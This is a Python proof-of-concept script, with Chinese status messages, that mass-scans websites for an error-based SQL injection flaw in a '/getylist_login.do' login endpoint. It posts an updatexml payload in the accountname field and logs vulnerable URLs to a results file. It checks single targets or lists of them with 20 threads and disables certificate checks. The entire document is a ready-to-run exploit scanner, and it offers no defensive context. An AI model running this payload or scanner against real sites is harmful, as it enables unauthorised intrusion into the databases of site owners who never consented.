import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
    "Content-Length": "0",
    }   
def poc(url):
    payload = '/getylist_login.do'
    target = url+payload
    data = "accountname=test' and (updatexml(1,concat(0x7e,(md5(1)),0x7e),1));--"
    try:
        rsp = requests.get(url=url,verify=False)
        if rsp.status_code == 200:
            rsp2 = requests.post(url=target,headers=headers,data=data,verify=False)
            if rsp2.status_code == 500:
                if 'c4ca4238a0b923820dcc509a6f75849' in rsp2.text:
                    print(f"[+]{url}存在sql注入")
                    with open('./result.txt','a',encoding="utf-8") as f:
                        f.write(url+'\n')
                else:
                    print(f"[-]{url}不存在sql注入")
            else:
                print(f"[-]{url}不存在sql注入")
    except Exception as e:
        print("该站点有问题")
        return False
def main():
    par = argparse.ArgumentParser()
    par.add_argument('-u','--url',dest='url',type=str,help='http://www.qqqq.com')
    par.add_argument('-f','--file',dest='file',type=str,help='target.txt')
    args = par.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and  args.file:
        url_list = []
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(20)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tUage:python {sys.argv[0]} -h")
if __name__ == '__main__':
    main()